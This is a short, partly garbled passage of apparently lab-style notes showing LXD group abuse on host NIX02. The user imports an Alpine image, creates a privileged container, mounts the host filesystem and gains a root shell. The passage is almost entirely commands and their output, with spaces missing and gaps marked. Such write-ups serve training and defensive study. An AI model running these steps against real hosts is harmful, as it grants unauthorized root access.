...
```
`devops@NIX02:~$unzipalpine.zipArchive:  alpine.zip
...
```
`devops@NIX02:~$lxd initDo you want to configure a new storage pool (yes/no) [default=yes]? yes
...
```
`devops@NIX02:~$lxc imageimportalpine.tar.gz alpine.tar.gz.root --alias alpineGenerating a client certificate. This may take a minute...
...
```
`devops@NIX02:~$lxc init alpine r00t -c security.privileged=trueCreating r00t`
```

Mount the host file system.

```
`devops@NIX02:~$lxc config deviceaddr00t mydev disksource=/path=/mnt/rootrecursive=trueDevice mydev added to r00t`
```
...
```
`devops@NIX02:~$lxc start r00tdevops@NIX02:~/64-bit Alpine$lxcexecr00t /bin/sh~#iduid=0(root) gid=0(root)~#`
```
...
```
`secaudit@NIX02:~$iduid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)`
```